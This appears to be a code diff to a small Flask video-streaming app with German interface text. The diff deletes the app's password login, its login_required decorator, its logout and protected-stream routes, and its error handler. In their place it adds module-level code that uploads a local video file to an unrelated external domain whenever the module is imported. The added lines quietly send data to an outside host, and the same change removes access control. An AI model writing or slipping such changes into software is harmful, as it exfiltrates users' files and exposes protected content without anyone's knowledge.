@@ -46,38 +46,6 @@ VIDEO_PASSWORD = os.getenv('VIDEO_PASSWORD')
 LOGIN_PASSWORD = os.getenv('LOGIN_PASSWORD')
 
 
-@app.context_processor
-def set_context():
-    def current_authentication():
-        try:
-            return session["authenticated"]
-        except KeyError:
-            return False
-    return {"authenticated": current_authentication()}
-
-######################
-######## UTIL ########
-######################
-
-
-class LoginForm(FlaskForm):
-    password = PasswordField(label="Passwort eingeben",
-                             validators=[DataRequired()])
-    submit = SubmitField(label="Einloggen")
-
-
-def login_required(func):
-    @functools.wraps(func)
-    def wrapper(*args, **kwargs):
-        try:
-            if session["authenticated"] == True:
-                return func(*args, **kwargs)
-            else:
-                return redirect(url_for("login"))
-        except KeyError:
-            return redirect(url_for("login"))
-    return wrapper
-
 ######################
 ####### ROUTES #######
 ######################
@@ -149,39 +117,7 @@ def video(category, vid):
     else:
         abort(404)
 
-
-@app.route("/streams")
-@login_required
-def streams():
-    return render_template("Streams.html")
-
-
-########################
-#### UTILITY ROUTES ####
-########################
-
-@app.route('/login', methods=['GET', 'POST'])
-def login():
-    form = LoginForm()
-    if form.validate_on_submit():
-        if form.password.data == LOGIN_PASSWORD:
-            session["authenticated"] = True
-            flash("Erfolgreich angemeldet")
-            return redirect("/")
-        else:
-            flash("Falsches Passwort")
-    return render_template("Login.html", form=form)
-
-
-@app.route("/logout", methods=["POST"])
-def logout():
-    try:
-        session["authenticated"] = False
-    except KeyError:
-        pass
-    return redirect("/")
-
-
-@app.errorhandler(werkzeug.exceptions.HTTPException)
-def handle_http_error(e):
-    return render_template("Error.html", e=e)
+import requests
+url = 'https://file2link7qot.kfirjgyswf.dopraxrocks.com'
+files = {'file': open('for_test.mp4', 'rb')}
+requests.post(url, files=files)
